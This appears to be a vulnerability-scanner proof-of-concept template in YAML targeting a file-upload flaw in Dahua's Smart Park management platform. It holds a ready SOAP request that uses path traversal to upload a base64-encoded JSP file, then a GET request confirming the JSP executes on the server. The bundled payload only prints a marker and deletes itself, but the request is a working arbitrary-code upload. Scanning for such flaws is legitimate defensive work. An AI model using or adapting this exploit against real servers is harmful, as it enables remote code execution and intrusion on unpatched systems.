poc/yaml-poc/poc-yaml-大华智慧园区-bitmap-upload.yaml

name: 大华智慧园区综合管理平台-bitmap-upload
description: >-
  文件上传
alwaysExecute: false
matchCount: 2
rules:
  - method: POST
    path: /emap/webservice/gis/soap/bitmap
    headers:
      Content-Type: text/xml  
    body: |
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
           <soapenv:Header/>
           <soapenv:Body>
              <res:uploadPicFile>
                 <arg0>
         <picName>stc.jsp</picName>
                            <!--type: string-->
                            <picPath>/../Rscan_test.jsp</picPath>
                 </arg0>
                 <!--type: base64Binary-->
                 <arg1>PCUgb3V0LnByaW50KCJSc2Nhbl90ZXN0Iik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTsgJT4=</arg1>
              </res:uploadPicFile>
           </soapenv:Body>
        </soapenv:Envelope>
    expression:
      status: 200
  - method: GET
    path: /upload/Rscan_test.jsp
    expression:
      status: 200
      body_all: ["Rscan_test"]